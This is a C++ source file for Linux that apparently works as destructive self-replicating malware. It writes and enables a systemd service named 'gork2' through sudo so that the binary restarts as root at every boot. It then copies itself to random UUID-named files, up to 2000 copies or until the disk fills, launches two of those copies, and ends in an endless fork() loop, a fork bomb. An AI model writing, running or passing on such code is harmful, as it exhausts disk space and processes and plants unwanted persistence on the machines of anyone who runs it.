#include <iostream>
#include <filesystem>
#include <iterator>
#include <fstream>
#include <string>
#include <uuid/uuid.h>
#include <unistd.h>
#include <sys/wait.h>
#include <vector>
#include <system_error>

pid_t spawn(const char* path , char* const argv[])
{
pid_t pid = fork();
if (pid == 0)
{
execvp(path , argv);
_exit(1);
}
return pid;
}
std::string somefunc()
{
/*std::filesystem::path dirpath = std::filesystem::current_path();

int count = static_cast<int>(std::distance(std::filesystem::directory_iterator(dirpath) , std::filesystem::directory_iterator{}));*/
char buffer[64];
uuid_t uuid;
uuid_generate_random(uuid);
uuid_unparse_lower(uuid,buffer);
return std::string(buffer);
}
int main(int argc , char* argv[])
{
//std::string filename;
if (argc > 0)
{
//filename = //std::filesystem::path(argv[0]).filename
std::filesystem::path filename = std::filesystem::absolute(argv[0]);
std::filesystem::path Spath 
= "/etc/systemd/system/gork2.service";
if (!std::filesystem::exists(Spath))
{
std::string cmd =
    "sudo sh -c '"
    "set -C; "
    "printf \"%s\\n\" "
    "'\"'[Unit]'\"' "
    "'\"'Description=Gork2 Application'\"' "
    "'\"'After=network.target'\"' "
    "'\"''\"' "
    "'\"'[Service]'\"' "
    "'\"'Type=simple'\"' "
    "'\"'ExecStart=" + filename.string() + "'\"' "
    "'\"'Restart=always'\"' "
    "'\"'RestartSec=5'\"' "
    "'\"'User=root'\"' "
    "'\"''\"' "
    "'\"'[Install]'\"' "
    "'\"'WantedBy=multi-user.target'\"' "
    "> /etc/systemd/system/gork2.service"
    "'";

std::system(cmd.c_str());
std::system("sudo systemctl daemon-reload");
std::system("sudo systemctl enable gork2");
std::system("sudo systemctl start gork2"); //assuming it is in root
}
std::filesystem::path child1 = std::filesystem::current_path() / (somefunc());
std::filesystem::path child2 = std::filesystem::current_path() / (somefunc());
std::filesystem::path child3 = std::filesystem::current_path() / (somefunc());
try
	{
		std::filesystem::copy_file(filename , child1);
	}
	catch (const std::filesystem::filesystem_error& e)
	{
		if (e.code() == std::errc::no_space_on_device)
		{
			std::cerr << "blah blah " << e.what() << "\n";
			
		}
		else
		{
			std::cerr << "not blah blah " << e.what() << "\n";
			
		}
}

try
	{
		std::filesystem::copy_file(filename , child2);
	}
	catch (const std::filesystem::filesystem_error& e)
	{
		if (e.code() == std::errc::no_space_on_device)
		{
			std::cerr << "blah blah " << e.what() << "\n";
			
		}
		else
		{
			std::cerr << "not blah blah " << e.what() << "\n";
		
		}
}
//std::filesystem::copy_file(filename , child1);
//std::filesystem::copy_file(filename , child2);
for (unsigned long long i = 0 ; i < 2000 ; i++)
{
	try
	{
		std::filesystem::copy_file(filename , child3);
	}
	catch (const std::filesystem::filesystem_error& e)
	{
		if (e.code() == std::errc::no_space_on_device)
		{
			std::cerr << "blah blah " << e.what() << "\n";
			break;
		}
		else
		{
			std::cerr << "not blah blah " << e.what() << "\n";
			break;
		}
	}
	child3 = std::filesystem::current_path() / (somefunc());
}
std::string schild1 = child1.string();
std::vector<char> v1(schild1.begin() , schild1.end() );
 v1.push_back('\0');
char* args1[] = {v1.data() , NULL};
std::string schild2 = child2.string();
std::vector<char> v2(schild2.begin() , schild2.end() );
v2.push_back('\0');
char* args2[] = {v2.data() , NULL};
pid_t pid1 = spawn(child1.string().c_str(), args1);
pid_t pid2 = spawn(child2.string().c_str() , args2);
waitpid(pid1 , NULL , 0);
waitpid(pid2 , NULL , 0);
}
while (true)
{
fork();
}
}

